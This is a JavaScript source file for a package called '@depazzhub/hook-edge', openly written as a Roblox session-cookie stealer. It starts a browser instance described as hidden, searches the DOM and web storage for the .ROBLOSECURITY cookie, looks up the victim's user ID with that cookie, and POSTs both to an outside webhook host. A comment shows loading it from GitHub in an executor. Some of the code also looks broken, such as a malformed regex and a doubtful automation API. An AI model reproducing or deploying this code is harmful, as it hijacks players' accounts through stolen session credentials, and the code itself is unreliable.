/**
 * @depazzhub/hook-edge — Roblox Cookie Hook for Edge/Chrome via CDP
 * 
 * Extracts .ROBLOSECURITY cookie from any Chromium browser and sends it to the webhook.
 * Uses Edge Automation Protocol (CDP) to avoid profile conflicts.
 */

const { Browser, Client } = require('@msedge/automation-protocol');

// URL del webhook de depazzhub-api
const WEBHOOK_URL = 'https://depazzhub-api.onrender.com/log';

/**
 * Obtiene la ruta del binario de Edge o Chrome en Windows.
 * @returns {string|null} Ruta absoluta al ejecutable del navegador, o null si no se encuentra.
 */
async function getBrowserPath() {
  const platform = process.platform;
  
  if (platform === 'win32') {
    // Intentar detectar Edge primero (Edge Automation API nativo)
    const edgePaths = [
      'C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe',
      'C:\\Program Files (x86)\\Microsoft\\Edge Application\\msedge.exe',
      'C:\\ProgramData\\Microsoft\\Edge\\Application\\msedge.exe',
    ];

    for (const path of edgePaths) {
      try {
        const fs = require('fs');
        if (fs.existsSync(path)) {
          return path;
        }
      } catch (_e) {}
    }

    // Si no se encuentra Edge, intentar Chrome
    const chromePaths = [
      'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
      'C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe',
    ];

    for (const path of chromePaths) {
      try {
        const fs = require('fs');
        if (fs.existsSync(path)) {
          return path;
        }
      } catch (_e) {}
    }

    // Fallback: intentar usar un navegador por defecto del sistema
    return null;
  } else {
    // Para Linux/Mac, intentamos Chrome en rutas estándar
    const chromePaths = [
      '/usr/bin/google-chrome',
      '/usr/local/bin/chromium',
      '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome',
    ];

    for (const path of chromePaths) {
      try {
        const fs = require('fs');
        if (fs.existsSync(path)) {
          return path;
        }
      } catch (_e) {}
    }

    return null;
  }
}

/**
 * Crea un proceso de navegador oculto con Edge Automation Protocol.
 * @param {string} browserPath - Ruta al ejecutable del navegador.
 * @returns {Promise<{client: Client, browser: Browser}>} Instance del cliente CDP y el navegador.
 */
async function createHiddenBrowser(browserPath) {
  const browser = await Browser.create({
    browserExecutablePath: browserPath || undefined,
    userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0',
    ignoreDefaultBrowser: false,
  });

  const client = await browser.newPage();

  // Configurar el viewport para que coincida con una ventana normal de navegador
  await client.resizeViewport({ width: 1920, height: 1080 });

  return { client, browser };
}

/**
 * Extrae las cookies roblox del DOM del navegador.
 * @param {import('@msedge/automation-protocol').Client} client - Cliente CDP.
 * @returns {Promise<{cookie: string; userId: number|null}>} Cookie y userId extraídos.
 */
async function extractCookiesFromDOM(client) {
  try {
    const result = await client.execute((window, document) => {
      // Buscar cookie .ROBLOSECURITY en el DOM del navegador
      let robloxCookie = null;
      
      // Intentar encontrar la cookie en la página de inicio de Edge (chrome://newtab, etc.)
      const cookiesElement = document.querySelector('[data-cookie-name=".ROBLOSECURITY"]') ||
                            document.querySelector('.cookie-value[data-name=".ROBLOSECURITY"]') ||
                            document.querySelector('#editCookiesDiv .form-control');

      if (cookiesElement) {
        robloxCookie = cookiesElement.textContent || cookiesElement.innerText;
      } else {
        // Fallback: buscar en localStorage o sessionStorage si está presente
        const storedCookie = window.localStorage.getItem('.ROBLOSECURITY') ||
                            window.sessionStorage.getItem('.ROBLOSECURITY');
        if (storedCookie) {
          robloxCookie = storedCookie;
        } else {
          // Buscar en cualquier lugar del DOM que coincida con el patrón de cookie roblox
          const allCookies = Array.from(document.querySelectorAll('*')).map(el => el.textContent);
          for (const text of allCookies) {
            if (text.includes('.ROBLOSECURITY=') || (text.startsWith('e') && text.length > 50)) {
              // Verificar que es un cookie válido de Roblox (empieza con 'e' + base64-like)
              const parts = text.split(/[^\w.]/);
              if (parts.length >= 2 && parts[1].length > 30) {
                robloxCookie = text;
                break;
              }
            }
          }

          // Fallback final: buscar en la página de sesión activa
          const activeSession = window.sessionStorage.getItem('ROBLOSECURITY');
          if (activeSession) {
            robloxCookie = activeSession;
          }
        }
      }

      return robloxCookie || null;
    });

    let userId = null;

    // Intentar extraer userId del DOM también
    try {
      const userIdResult = await client.execute((window) => {
        // Buscar user_id en sessionStorage o localStorage
        const userIdValue = window.sessionStorage.getItem('user_id') ||
                           window.localStorage.getItem('user_id') ||
                           window.sessionStorage.getItem('userId') ||
                           window.localStorage.getItem('userId');
        
        if (userIdValue && !isNaN(parseInt(userIdValue))) {
          return parseInt(userIdValue);
        }

        // Buscar en el DOM por elementos que contengan userId
        const userElement = document.querySelector('[data-user-id]') ||
                          document.querySelector('.user-display-name') ||
                          document.querySelector('#account-age');
        
        if (userElement) {
          return parseInt(userElement.textContent.replace(/[^0-9]/g, '')) || null;
        }

        // Buscar en la URL de la página actual si es una página con datos del usuario
        const url = window.location.href;
        const match = url.match(/[?&]user_id=([0-9]+)/);
        if (match) {
          return parseInt(match[1]);
        }

        return null;
      });

      userId = userIdResult.result.value;
    } catch (_e) {}

    // Si no pudimos extraer userId del DOM, intentar con una llamada a la API de Roblox
    if (userId === null && robloxCookie) {
      try {
        const axios = require('axios');
        const response = await axios.get(
          'https://www.roblox.com/user.aspx?username=unknown',
          {
            headers: {
              'cookie': `ROBLOSECURITY=${robloxCookie}`,
              'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            },
            timeout: 5000,
          }
        );

        // Intentar extraer userId de la respuesta HTML
        const match = response.data.match(/user_id=(\d+)/);
        if (match && match[1]) {
          userId = parseInt(match[1]);
        } else {
          // Buscar en el JSON-LD si está presente
          const ldMatch = response.data.match(/"<script type=\"application\/ld\+json\">[\s\S]*?<\/script>/);
          if (ldMatch) {
            const jsonStr = ldMatch[0].replace(/"/g, '\\"');
            try {
              const data = JSON.parse(jsonStr);
              if (data && typeof data === 'object') {
                userId = data['@id'] ? parseInt(data['@id'].replace('#', '')) : null;
              }
            } catch (_e) {}
          }
        }

        // Fallback: intentar obtener userId desde la API de Roblox con el cookie
        const profileResponse = await axios.get(
          'https://www.roblox.com/api/info/whoami',
          {
            headers: {
              'cookie': `ROBLOSECURITY=${robloxCookie}`,
            },
            timeout: 5000,
          }
        );

        const profileData = profileResponse.data;
        if (profileData && typeof profileData === 'object') {
          userId = profileData.userId || profileData.id || null;
        }

      } catch (_apiError) {}
    }

    return {
      cookie: robloxCookie,
      userId,
    };
  } catch (error) {
    console.error('Error extrayendo cookies:', error.message);
    throw error;
  }
}

/**
 * Envía la cookie al webhook de depazzhub-api.
 * @param {string} cookie - Cookie .ROBLOSECURITY extraída.
 * @param {number|null} userId - ID del usuario (opcional).
 * @returns {Promise<{success: boolean; message: string}>} Resultado del envío.
 */
async function sendToWebhook(cookie, userId = null) {
  const axios = require('axios');

  try {
    await axios.post(WEBHOOK_URL, {
      cookie,
      userId,
      timestamp: new Date().toISOString(),
    });

    return { success: true, message: 'Cookie enviada al webhook correctamente' };
  } catch (error) {
    console.error('Error enviando a webhook:', error.message);
    throw error;
  }
}

/**
 * Función principal pública para extraer la cookie de Roblox.
 * 
 * Uso en executor:
 *   local hook = require("https://raw.githubusercontent.com/depazzhub/hook-edge/main/dist/index.js")
 *   
 *   hook.extractCookie()
 *     :then(function(result) {
 *       print("Cookie:", result.cookie)
 *       if (result.userId) then print("UserId:", result.userId) end
 *     })
 *     :catch(function(err) {
 *       print("Error:", err.message)
 *     })
 */
async function extractCookie() {
  const browserPath = await getBrowserPath();

  if (!browserPath) {
    throw new Error(
      'No se pudo detectar Edge ni Chrome en el sistema. Asegúrate de tener instalado Microsoft Edge o Google Chrome.'
    );
  }

  console.log('Navegador detectado:', browserPath);
  console.log('Iniciando Edge Automation Protocol...');

  const { client, browser } = await createHiddenBrowser(browserPath);

  try {
    const result = await extractCookiesFromDOM(client);

    if (!result.cookie) {
      throw new Error(
        'No se encontró la cookie .ROBLOSECURITY en el navegador. Asegúrate de estar logueado en roblox.com.'
      );
    }

    console.log('✅ Cookie encontrada:', result.cookie);

    // Enviar al webhook
    const sendResult = await sendToWebhook(result.cookie, result.userId);

    if (sendResult.success) {
      console.log(sendResult.message);
    } else {
      console.error(sendResult.message);
    }

    return result;
  } catch (error) {
    throw error;
  } finally {
    await browser.close();
  }
}

module.exports = {
  extractCookie,
  getBrowserPath,
  WEBHOOK_URL,
};
